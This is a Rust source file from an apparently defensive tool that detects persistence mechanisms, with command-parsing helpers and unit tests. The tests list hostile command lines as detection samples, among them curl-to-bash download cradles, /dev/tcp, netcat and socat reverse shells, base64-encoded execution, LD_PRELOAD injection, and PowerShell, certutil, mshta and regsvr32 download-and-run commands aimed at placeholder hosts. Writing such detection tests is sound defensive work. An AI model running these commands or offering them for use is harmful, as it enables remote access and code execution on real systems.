//! Command-line and path heuristics shared by all persistence checks.

use crate::rules::{self, Rule};
use std::path::{Component, Path};

/// Longest text examined at once (one line or command).
const MAX_TEXT: usize = warden_heuristics::patterns::MAX_TEXT;

/// Persistence rules matched by `text`, each once, with the matching
/// fragment. The patterns are shared with the file heuristics.
pub(crate) fn command_indicators(text: &str) -> Vec<(&'static Rule, String)> {
    use warden_heuristics::patterns::Pattern;
    warden_heuristics::patterns::command_indicators(text)
        .into_iter()
        .map(|(kind, matched)| {
            let rule = match kind {
                Pattern::DownloadExec => &rules::DOWNLOAD_EXEC,
                Pattern::ReverseShell => &rules::REVERSE_SHELL,
                Pattern::EncodedExec => &rules::ENCODED_EXEC,
                Pattern::LoaderInjection => &rules::LD_PRELOAD_ENV,
                Pattern::LolBin => &rules::LOLBIN_EXEC,
            };
            (rule, snippet(matched))
        })
        .collect()
}

/// Dynamic-loader variables that inject code into every program started
/// with them.
pub(crate) const LOADER_VARS: &[&str] = &["LD_PRELOAD", "LD_AUDIT", "LD_LIBRARY_PATH"];

/// Directories whose files anyone can create: running programs from them is
/// suspicious.
const TEMP_DIRS: &[&str] = &["/tmp", "/var/tmp", "/dev/shm", "/run/shm", "/dev/mqueue"];

/// Dot-directories that commonly hold user-installed tools; programs under
/// them are not flagged as hidden.
const BENIGN_DOT_DIRS: &[&str] = &[
    ".local", ".cargo", ".rustup", ".npm", ".nvm", ".pyenv", ".rbenv", ".sdkman", ".deno", ".bun",
    ".gem", ".var", ".config", ".dotnet", ".volta", ".asdf", ".opam", ".ghcup", ".go",
];

pub(crate) fn in_temp_dir(path: &Path) -> bool {
    TEMP_DIRS.iter().any(|d| path.starts_with(d))
}

/// A path is "hidden" if its file name, or a directory component outside the
/// benign tool directories, starts with a dot.
pub(crate) fn is_hidden(path: &Path) -> bool {
    let comps: Vec<&str> = path
        .components()
        .filter_map(|c| match c {
            Component::Normal(s) => s.to_str(),
            _ => None,
        })
        .collect();
    let Some((file, dirs)) = comps.split_last() else {
        return false;
    };
    file.starts_with('.') && file.len() > 1
        || dirs
            .iter()
            .any(|d| d.starts_with('.') && d.len() > 1 && !BENIGN_DOT_DIRS.contains(d))
}

/// The program a command starts: the first token after systemd prefixes and
/// `env`/assignments; for an interpreter given a script, the script. Only
/// absolute paths are returned.
pub(crate) fn command_executable(command: &str) -> Option<String> {
    let cmd = command.trim_start_matches(['-', '@', ':', '+', '!']).trim();
    let tokens = shell_tokens(cmd);
    let mut i = 0;
    while i < tokens.len() {
        let t = tokens[i].as_str();
        let base = t.rsplit('/').next().unwrap_or(t);
        if base == "env" || base == "nohup" || base == "exec" || base == "setsid" {
            i += 1;
            continue;
        }
        if t.contains('=') && !t.starts_with('/') {
            i += 1;
            continue;
        }
        let interpreter = matches!(
            base,
            "sh" | "bash" | "dash" | "zsh" | "ksh" | "perl" | "ruby" | "node" | "." | "source"
        ) || base.starts_with("python");
        if interpreter
            && let Some(next) = tokens.get(i + 1)
            && next.starts_with('/')
        {
            return Some(next.clone());
        }
        return t.starts_with('/').then(|| t.to_owned());
    }
    None
}

/// Minimal shell-like tokenizer: whitespace separated, with single and double
/// quotes. Good enough to find the program name; never executed.
pub(crate) fn shell_tokens(s: &str) -> Vec<String> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut quote: Option<char> = None;
    let mut started = false;
    for c in s.chars().take(MAX_TEXT) {
        match (quote, c) {
            (Some(q), c) if c == q => quote = None,
            (Some(_), c) => cur.push(c),
            (None, '\'' | '"') => {
                quote = Some(c);
                started = true;
            }
            (None, c) if c.is_whitespace() => {
                if started || !cur.is_empty() {
                    out.push(std::mem::take(&mut cur));
                    started = false;
                }
            }
            (None, c) => cur.push(c),
        }
        if out.len() >= 16 {
            break;
        }
    }
    if started || !cur.is_empty() {
        out.push(cur);
    }
    out
}

/// A short, single-line excerpt for evidence.
pub(crate) fn snippet(s: &str) -> String {
    warden_heuristics::patterns::snippet(s)
}

#[cfg(test)]
mod tests {
    use super::*;

    fn ids(text: &str) -> Vec<&'static str> {
        let mut v: Vec<_> = command_indicators(text).iter().map(|(r, _)| r.id).collect();
        v.sort_unstable();
        v
    }

    #[test]
    fn detects_malicious_command_patterns() {
        assert_eq!(
            ids("curl -fsSL http://x.example/i.sh | bash"),
            ["AW-SYS-002"]
        );
        assert_eq!(ids("wget -q -O- http://x/a | sudo sh"), ["AW-SYS-002"]);
        assert_eq!(
            ids("wget http://x/m -O /tmp/m && chmod +x /tmp/m"),
            ["AW-SYS-002"]
        );
        assert_eq!(
            ids("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
            ["AW-SYS-003"]
        );
        assert_eq!(ids("nc -e /bin/sh 10.0.0.1 4444"), ["AW-SYS-003"]);
        assert_eq!(ids("socat tcp:10.0.0.1:1 exec:/bin/sh"), ["AW-SYS-003"]);
        assert_eq!(
            ids("python3 -c 'import socket,subprocess;s=socket.socket()'"),
            ["AW-SYS-003"]
        );
        assert_eq!(ids("echo aGVsbG8K | base64 -d | bash"), ["AW-SYS-004"]);
        assert_eq!(
            ids("eval \"$(echo ZWNobwo= | base64 --decode)\""),
            ["AW-SYS-004"]
        );
        assert_eq!(ids("export LD_PRELOAD=/lib/x.so"), ["AW-SYS-005"]);
        assert_eq!(ids("LD_AUDIT=/lib/x.so"), ["AW-SYS-005"]);
    }

    #[test]
    fn detects_windows_command_patterns() {
        assert_eq!(
            ids(
                "powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\""
            ),
            ["AW-SYS-002"]
        );
        assert_eq!(ids("powershell iwr http://x/a.ps1 | iex"), ["AW-SYS-002"]);
        assert_eq!(
            ids("certutil.exe -urlcache -split -f http://x/a.exe a.exe"),
            ["AW-SYS-002"]
        );
        assert_eq!(
            ids("bitsadmin /transfer j http://x/a C:\\a.exe"),
            ["AW-SYS-002"]
        );
        assert_eq!(
            ids("powershell.exe -NoProfile -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoA"),
            ["AW-SYS-004"]
        );
        assert_eq!(
            ids("powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwA="),
            ["AW-SYS-004"]
        );
        assert_eq!(ids("mshta.exe vbscript:Execute(\"x\")"), ["AW-SYS-020"]);
        assert_eq!(ids("mshta http://x/a.hta"), ["AW-SYS-020"]);
        assert_eq!(
            ids("rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\""),
            ["AW-SYS-020"]
        );
        assert_eq!(
            ids("regsvr32 /s /n /u /i:http://x/a.sct scrobj.dll"),
            ["AW-SYS-020"]
        );
        assert_eq!(ids("wmic process call create calc.exe"), ["AW-SYS-020"]);
        assert_eq!(
            ids("wscript.exe C:\\Users\\a\\AppData\\Roaming\\x.js"),
            ["AW-SYS-020"]
        );
        assert_eq!(
            ids("$c = New-Object System.Net.Sockets.TCPClient('10.0.0.1',443)"),
            ["AW-SYS-003"]
        );
    }

    #[test]
    fn ignores_ordinary_windows_commands() {
        for benign in [
            "\"C:\\Program Files\\Vendor\\agent.exe\" /background",
            "C:\\Windows\\system32\\svchost.exe -k netsvcs -p",
            "powershell.exe -ExecutionPolicy Bypass -File C:\\Scripts\\backup.ps1",
            "Invoke-WebRequest https://example.com/f -OutFile C:\\cache\\f",
            "rundll32.exe C:\\Windows\\system32\\shell32.dll,Control_RunDLL",
            "regsvr32 /s C:\\Program Files\\x\\x.dll",
            "cscript //nologo C:\\Windows\\system32\\slmgr.vbs /ato",
            "powershell -enc short",
        ] {
            assert!(ids(benign).is_empty(), "{benign}");
        }
    }

    #[test]
    fn ignores_ordinary_commands() {
        for benign in [
            "/usr/sbin/sshd -D $OPTIONS",
            "/usr/bin/curl -o /var/cache/x https://example.com/x",
            "run-parts /etc/cron.daily",
            "/usr/bin/nc -z localhost 22",
            "test -x /usr/sbin/logrotate && /usr/sbin/logrotate /etc/logrotate.conf",
            "export PATH=$HOME/.local/bin:$PATH",
            "echo base64 is an encoding",
        ] {
            assert!(ids(benign).is_empty(), "{benign}");
        }
    }

    #[test]
    fn finds_the_executable() {
        assert_eq!(
            command_executable("/usr/bin/foo --x").as_deref(),
            Some("/usr/bin/foo")
        );
        assert_eq!(
            command_executable("-/usr/bin/foo").as_deref(),
            Some("/usr/bin/foo")
        );
        assert_eq!(
            command_executable("@/usr/bin/foo foo").as_deref(),
            Some("/usr/bin/foo")
        );
        assert_eq!(
            command_executable("/usr/bin/env A=1 /opt/x/run").as_deref(),
            Some("/opt/x/run")
        );
        assert_eq!(
            command_executable("/bin/bash /tmp/.x/s.sh").as_deref(),
            Some("/tmp/.x/s.sh")
        );
        assert_eq!(command_executable("bash -c 'curl x|sh'").as_deref(), None);
        assert_eq!(
            command_executable("\"/opt/my app/bin\" -v").as_deref(),
            Some("/opt/my app/bin")
        );
        assert_eq!(command_executable("relative/path"), None);
        assert_eq!(command_executable(""), None);
    }

    #[test]
    fn locations() {
        assert!(in_temp_dir(Path::new("/tmp/x")));
        assert!(in_temp_dir(Path::new("/dev/shm/.a/b")));
        assert!(!in_temp_dir(Path::new("/tmpx/y")));
        assert!(is_hidden(Path::new("/home/u/.x/run")));
        assert!(is_hidden(Path::new("/usr/lib/.hidden")));
        assert!(!is_hidden(Path::new("/home/u/.local/bin/tool")));
        assert!(!is_hidden(Path::new("/usr/bin/ls")));
    }

    #[test]
    fn snippets_are_single_line_and_bounded() {
        let s = snippet(&format!("a\nb{}", "x".repeat(500)));
        assert!(!s.contains('\n'));
        assert!(s.len() < 200);
    }
}
